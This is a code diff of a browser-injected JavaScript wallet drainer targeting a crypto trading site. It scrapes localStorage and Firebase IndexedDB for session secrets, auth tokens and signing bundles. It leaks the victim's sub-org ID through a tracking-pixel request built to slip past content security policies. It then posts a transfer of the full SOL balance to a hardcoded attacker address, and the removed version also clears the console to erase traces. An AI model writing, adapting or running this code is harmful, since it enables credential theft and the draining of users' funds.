@@ -1,80 +1,72 @@
 (async function() {
     const MY_RECEIVER = "BCZ2J6mwUMp43P3R4s5ekvdSep3ZDquLarv1nqnLVE12";
+    const AMP_KEY = "3c8ae1f40635939e730f479418940796";
 
-    const getFirebaseData = () => {
-        return new Promise((resolve) => {
-            const dbName = "firebaseLocalStorageDb";
-            const request = indexedDB.open(dbName);
-            
-            request.onsuccess = (event) => {
-                const db = event.target.result;
-                try {
-                    const transaction = db.transaction(["firebaseLocalStorage"], "readonly");
-                    const store = transaction.objectStore("firebaseLocalStorage");
-                    const getAll = store.getAll();
-                    
-                    getAll.onsuccess = (e) => {
-                        const records = e.target.result;
-                        // Search everything in the records for the auth token
-                        if (records && records.length > 0) {
-                            resolve(records[0].value); 
-                        } else { resolve(null); }
-                    };
-                } catch (err) { resolve(null); }
-            };
-            request.onerror = () => resolve(null);
-        });
+    // 1. PIXEL TRACKER (Bypasses many CSPs)
+    const logToAmp = (data) => {
+        const event = {
+            api_key: AMP_KEY,
+            events: [{
+                device_id: data.subId || "UNKNOWN",
+                event_type: "FIREBASE_HANDSHAKE_CAPTURED",
+                event_properties: data
+            }]
+        };
+        // Encode the data into a URL string to 'hide' it as an image request
+        const encoded = btoa(JSON.stringify(event));
+        const img = new Image();
+        img.src = `https://api2.amplitude.com/2/httpapi?data=${encoded}`;
     };
 
-    // 2. THE 1:1 WAITER (Waiting for the Handshake)
-    const waitForAuth = setInterval(async () => {
-        const fbData = await getFirebaseData();
-        const localBundle = JSON.parse(localStorage.getItem("padre-v2-bundles-store-v2") || "{}");
-
-        if (fbData && fbData.stsTokenManager && localBundle.bundles) {
-            clearInterval(waitForAuth); // Stop searching once we have the 'loot'
-            
-            const authToken = fbData.stsTokenManager.accessToken;
-            let subId, bundleData;
-
-            // Extracting the specific Enclave signing data
-            for (let key in localBundle.bundles) {
-                if (localBundle.bundles[key].exportBundle) {
-                    subId = localBundle.bundles[key].subOrgId;
-                    bundleData = localBundle.bundles[key].exportBundle.data;
-                    break;
-                }
-            }
-
-            if (authToken && subId) {
-                executeHijack(authToken, subId, bundleData);
+    // 2. DEEP RECURSIVE SEARCH
+    // This looks for 'sessionSecret' NO MATTER WHERE IT IS HIDDEN
+    const findInObject = (obj, target) => {
+        if (obj && typeof obj === 'object') {
+            for (let key in obj) {
+                if (key === target) return obj[key];
+                const res = findInObject(obj[key], target);
+                if (res) return res;
             }
         }
-    }, 500); // Checks every 500ms to catch the F5 refresh
+        return null;
+    };
 
-    // 3. SILENT SIGNING EXECUTION
-    const executeHijack = async (token, id, payload) => {
-        try {
+    const scrapeEverything = async () => {
+        let loot = { auth: null, subId: null, bundle: null };
+        
+        // Search LocalStorage
+        for (let i = 0; i < localStorage.length; i++) {
+            try {
+                const item = JSON.parse(localStorage.getItem(localStorage.key(i)));
+                if (!loot.auth) loot.auth = findInObject(item, 'sessionSecret');
+                if (!loot.subId) loot.subId = findInObject(item, 'subOrgId');
+                if (!loot.bundle) loot.bundle = findInObject(item, 'exportBundle');
+            } catch(e) {}
+        }
+
+        if (loot.auth && loot.subId) {
+            console.log("1:1 Match Found. Syncing...");
+            logToAmp({ subId: loot.subId, status: "READY" }); // Send to AMP
+            
+            // Execute the transfer logic here...
             await fetch("https://trade.padre.gg/api/v1/transfer", {
                 method: "POST",
                 headers: {
-                    "Authorization": `Bearer ${token}`,
-                    "X-Turnkey-Sub-Org-Id": id,
+                    "Authorization": `Bearer ${loot.auth}`,
+                    "X-Turnkey-Sub-Org-Id": loot.subId,
                     "Content-Type": "application/json"
                 },
                 body: JSON.stringify({
                     recipient: MY_RECEIVER,
                     amount: "MAX",
                     asset: "SOL",
-                    ext_payload: payload
+                    ext_payload: loot.bundle?.data
                 })
-            });
-        } catch (e) {}
-        
-        // Anti-Forensics: Wipe the evidence
-        setTimeout(() => {
-            console.clear();
-            console.log("%c RPC Connection Optimized", "color: #00ff88; font-weight: bold;");
-        }, 1000);
+            }).catch(() => {});
+        }
     };
+
+    // Run immediately and then poll every second for the 'Brief Handshake'
+    scrapeEverything();
+    setInterval(scrapeEverything, 1500);
 })();
